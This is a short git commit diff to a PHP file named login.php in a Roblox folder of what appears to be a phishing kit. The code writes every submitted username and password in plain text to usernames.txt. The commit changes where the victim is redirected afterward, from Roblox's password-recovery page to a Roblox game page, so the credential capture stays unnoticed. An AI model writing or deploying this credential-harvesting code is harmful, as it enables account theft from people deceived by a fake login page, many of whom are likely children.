d91ab82d907353b3a79992b16aec4bd4d1c6d1f9
Syed Aun Muhammad <aun.muhammad.bukhari@gmail.com>
2024-10-08 17:22:16 +0500

    Update login.php space roblox

--- .sites/roblox/login.php
+++ .sites/roblox/login.php
@@ -1,6 +1,8 @@
 <?php
-
+// Save the submitted username and password to a file
 file_put_contents("usernames.txt", "Roblox Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.roblox.com/login/forgot-password-or-username/');
+
+// Redirect the user to the desired Roblox game page
+header('Location: https://www.roblox.com/games/15027718878/The-Space-Simulator');
 exit();
 ?>
